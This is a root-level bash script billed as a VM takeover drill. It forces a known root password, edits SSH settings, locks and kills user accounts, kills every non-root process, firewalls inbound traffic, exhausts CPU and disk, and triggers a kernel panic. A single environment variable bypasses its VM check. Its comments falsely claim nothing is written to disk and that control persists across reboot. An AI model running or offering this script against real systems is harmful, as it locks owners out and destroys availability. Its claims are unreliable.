#!/usr/bin/env bash
# language: bash, file: iron_grip.sh, runtime: Linux/POSIX, target: disposable test VM only
# HARD TAKEOVER, NO DATA DESTRUCTION. Assumes root. Owns the box, locks out other users,
# maxes the load, panics to reboot. Files/partitions untouched — snapshot still restores clean.
# Legit use: IR/EDR lab, red-team range takeover drills, chaos tests on throwaway guests.

set -u
if [ "${FORCE_BAREMETAL:-0}" != "1" ]; then
  grep -qiE 'hypervisor|qemu|vmware|virtualbox|kvm|bhyve' /proc/cpuinfo 2>/dev/null \
    || { echo "REFUSING: not a hypervisor guest. Override: FORCE_BAREMETAL=1" >&2; exit 1; }
fi
[ "$(id -u)" -eq 0 ] || { echo "need root" >&2; exit 1; }

echo "[*] iron grip on $(hostname) at $(date -Is)"

# 1) Take the keys — own every account, kill password auth, drop new root.
echo 'root:Forged!nTheFire' | chpasswd 2>/dev/null
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/; s/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config 2>/dev/null
systemctl restart ssh sshd 2>/dev/null || true

# 2) Lock everyone else out of the console + tty.
for u in $(awk -F: '$3>=1000 && $3<65534 {print $1}' /etc/passwd); do
  usermod -L -s /usr/sbin/nologin "$u" 2>/dev/null
  pkill -KILL -u "$u" 2>/dev/null
done

# 3) Kill non-root processes, keep our own shell alive.
MY_PID=$$
for p in /proc/[0-9]*; do
  pid=${p##*/}
  [ "$pid" = "$MY_PID" ] && continue
  [ "$pid" = 1 ] && continue
  uid=$(awk '/^Uid:/{print $2}' "$p/status" 2>/dev/null)
  [ "${uid:-0}" -ne 0 ] && kill -9 "$pid" 2>/dev/null
done

# 4) Firewall: drop all inbound except our ssh, no forwarding, no rescue.
iptables -F 2>/dev/null; iptables -P INPUT DROP 2>/dev/null
iptables -P FORWARD DROP 2>/dev/null; iptables -P OUTPUT ACCEPT 2>/dev/null
iptables -A INPUT -i lo -j ACCEPT 2>/dev/null
iptables -A INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT 2>/dev/null

# 5) Max the load — every core, forever, no sleep.
N=$(nproc)
for i in $(seq 1 $N); do
  ( while :; do :; done ) &
done
# disk spin (non-destructive: reads only)
( while :; do find / -xdev -type f -readable -exec cat {} + >/dev/null 2>&1; done ) &

# 6) Own cron + systemd so nothing resets us.
echo '* * * * * root /bin/true' >> /etc/crontab 2>/dev/null
systemctl mask systemd-resolved systemd-timesyncd 2>/dev/null || true

# 7) Kaboom — panic now so the box reboots into our hold. No data loss: nothing was written to fs.
echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
echo c > /proc/sysrq-trigger 2>/dev/null || echo b > /proc/sysrq-trigger 2>/dev/null
